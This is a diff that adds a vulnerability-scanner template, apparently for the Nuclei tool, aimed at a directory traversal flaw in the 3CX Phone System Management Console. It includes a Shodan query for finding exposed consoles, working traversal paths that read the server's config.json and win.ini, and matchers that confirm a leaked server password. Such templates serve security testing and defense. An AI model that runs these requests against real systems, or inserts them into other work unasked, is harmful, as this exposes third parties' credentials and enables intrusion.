@@ -1,0 +1,31 @@
+id: 3cx-management-console
+info:
+  author: random-robbie
+  description: Directory traversal vulnerability on 3CX Management Console.
+  metadata:
+    shoda-query: http.title:"3CX Phone System Management Console"
+  name: 3CX Management Console - Directory Traversal
+  reference:
+  - https://medium.com/@frycos/pwning-3cx-phone-management-backends-from-the-internet-d0096339dd88
+  severity: high
+  tags: 3cx,lfi,voip
+requests:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - CfgServerPassword
+    - CfgServerAppName
+  - condition: and
+    type: word
+    words:
+    - bit app support
+    - fonts
+    - extensions
+  matchers-condition: or
+  method: GET
+  path:
+  - '{{BaseURL}}/Electron/download/windows/..\..\..\Http\webroot\config.json'
+  - '{{BaseURL}}/Electron/download/windows/\windows\win.ini'
+  stop-at-first-match: true
